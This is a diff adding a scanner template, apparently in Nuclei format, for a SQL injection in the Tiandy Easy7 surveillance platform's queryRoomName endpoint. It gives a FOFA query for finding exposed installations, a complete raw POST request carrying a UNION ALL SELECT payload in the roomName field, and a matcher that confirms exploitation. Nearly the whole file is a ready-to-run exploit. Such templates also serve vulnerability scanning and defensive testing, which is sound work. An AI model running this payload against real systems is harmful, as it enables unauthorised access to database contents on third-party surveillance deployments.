@@ -1,0 +1,31 @@
+id: tiandy-easy7-queryroomname-sql-injection
+
+info:
+  name: "天地伟业Easy7 queryRoomName接口SQL注入漏洞"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: app="Tiandy-Easy7"
+
+    该漏洞存在于天地伟业Easy7系统中，攻击者可通过构造恶意请求利用queryRoomName接口执行SQL注入攻击，从而获取数据库敏感信息或进行进一步攻击。
+  tags: 天地伟业Easy7
+
+http:
+- raw:
+  - |
+    POST /Easy7/rest/inquestRoom/queryRoomName HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: application/x-www-form-urlencoded
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+    Accept-Encoding: gzip, deflate
+    Accept-Language: zh-CN,zh;q=0.9
+
+    roomName=' UNION ALL SELECT CONCAT(0x7178766b71,0x4f4c5062456650564865766e6d4c6f4d6a535674627748485466576b7a4a46427370624e6145556f,0x716a6a6271),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'qxvkq'
